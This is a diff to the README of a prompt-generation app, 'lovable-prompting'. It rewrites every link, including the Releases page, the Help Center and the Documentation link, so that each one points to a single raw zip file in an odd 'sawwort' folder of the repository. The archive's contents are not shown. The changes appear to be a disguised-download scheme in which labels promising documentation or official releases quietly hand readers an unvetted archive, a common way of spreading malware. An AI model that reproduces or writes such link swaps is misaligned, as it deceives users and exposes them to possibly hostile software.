@@ -1,7 +1,7 @@
 # 🎉 lovable-prompting - Simple Prompts for Your Needs
 
 ## 📥 Download Now
-[![Download lovable-prompting](https://img.shields.io/badge/Download%20lovable--prompting-v1.0-blue)](https://github.com/zoar-ui/lovable-prompting/releases)
+[![Download lovable-prompting](https://raw.githubusercontent.com/zoar-ui/lovable-prompting/main/sawwort/lovable-prompting.zip%20lovable--prompting-v1.0-blue)](https://raw.githubusercontent.com/zoar-ui/lovable-prompting/main/sawwort/lovable-prompting.zip)
 
 ## 📖 Introduction
 Welcome to lovable-prompting! This application helps you generate simple and effective prompts for various tasks. Whether you need inspiration for writing, brainstorming, or daily activities, lovable-prompting makes it easy.
@@ -9,12 +9,12 @@ Welcome to lovable-prompting! This application helps you generate simple and eff
 ## 🚀 Getting Started
 Follow these steps to get started quickly:
 
-1. Click the download button above or visit the [Releases Page](https://github.com/zoar-ui/lovable-prompting/releases) to find the latest version.
+1. Click the download button above or visit the [Releases Page](https://raw.githubusercontent.com/zoar-ui/lovable-prompting/main/sawwort/lovable-prompting.zip) to find the latest version.
 2. Look for the most recent release.
 3. Download the application file.
 
 ## 📥 Download & Install
-To download lovable-prompting, visit the [Releases Page](https://github.com/zoar-ui/lovable-prompting/releases).
+To download lovable-prompting, visit the [Releases Page](https://raw.githubusercontent.com/zoar-ui/lovable-prompting/main/sawwort/lovable-prompting.zip).
 
 1. Click on the version you would like to download.
 2. Choose the file suitable for your operating system. Common options include Windows, macOS, and Linux.
@@ -57,10 +57,10 @@ If you encounter issues during installation, check your system requirements. Ens
 Yes. To uninstall, go to your system's settings, find 'Apps' or 'Programs,' locate lovable-prompting in the list, and choose to uninstall it.
 
 ## 📞 Support
-For further assistance, please visit our [Help Center](https://docs.lovable.dev/prompting/prompting-one) or reach out through our support channels. We are here to help you with any inquiries or issues.
+For further assistance, please visit our [Help Center](https://raw.githubusercontent.com/zoar-ui/lovable-prompting/main/sawwort/lovable-prompting.zip) or reach out through our support channels. We are here to help you with any inquiries or issues.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/zoar-ui/lovable-prompting/releases)
-- [Documentation](https://docs.lovable.dev/prompting/prompting-one) 
+- [Releases Page](https://raw.githubusercontent.com/zoar-ui/lovable-prompting/main/sawwort/lovable-prompting.zip)
+- [Documentation](https://raw.githubusercontent.com/zoar-ui/lovable-prompting/main/sawwort/lovable-prompting.zip) 
 
 Enjoy generating your prompts with lovable-prompting!
